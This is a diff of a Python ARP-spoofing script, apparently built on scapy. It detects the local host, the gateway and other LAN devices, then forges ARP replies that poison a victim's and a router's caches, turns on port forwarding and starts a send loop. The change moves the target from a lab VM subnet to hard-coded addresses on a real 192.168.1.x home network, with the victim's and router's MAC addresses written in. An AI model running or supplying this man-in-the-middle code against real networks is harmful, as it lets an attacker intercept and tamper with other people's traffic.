@@ -84,7 +84,9 @@ if __name__ == "__main__":
     # get ip without /24
     ip      = getHostIp()
     hostip  = ip 
-    hostmac = getHwAddr('enp0s3')
+    hostmac = getHwAddr('wlo1')
+    routerIp = get_default_gateway_linux()
+    routerMac = ""
 
     # ip and MAC address of command "ip addr"
     # search Ip with subnet mask by using ip we already know
@@ -107,8 +109,6 @@ if __name__ == "__main__":
     mac = re.findall(
         "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)
 
-    default_gateway = get_default_gateway_linux()
-
     for i in ip:
         if(i == hostip):
             ip.remove(i)
@@ -116,16 +116,17 @@ if __name__ == "__main__":
         
     _len = len(ip)
     for i in range(0, _len):
-        if(ip[i] == default_gateway):
+        if(ip[i] == routerIp):
+            routerMac = mac[i]
             ip.remove(ip[i])
             mac.remove(mac[i])
             break
 
     print("")
 
-    print("default Gateway: ", default_gateway)
-    print("host ip: ", hostip)
-    print("host MAC", hostmac)
+    print("router Ip: %-18s MAC: %s" % (routerIp,routerMac))
+    print("host   Ip: %-18s MAC: %s" % (hostip, hostmac))
+    # print("host MAC", hostmac)
 
     print("")
 
@@ -137,9 +138,10 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
-    victimpacket = ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:df:ef:2c", psrc="10.0.2.1", hwsrc="08:00:27:25:a4:94")
-
-    routerpacket = ARP(op=2, pdst="10.0.2.1", hwdst="52:54:00:12:35:00", psrc="10.0.2.5", hwsrc="08:00:27:25:a4:94")
+    victimpacket = ARP(op=2, pdst="192.168.1.104", hwdst="08:00:27:DF:EF:2C",
+                       psrc="192.168.1.1", hwsrc="7c:76:35:a9:6c:a8")
+    routerpacket = ARP(op=2, pdst="192.168.1.1", hwdst="38:6B:1C:C3:8C:68",
+                       psrc="192.168.1.104", hwsrc="7c:76:35:a9:6c:a8")
 
     port_forwarding()
     while(1):
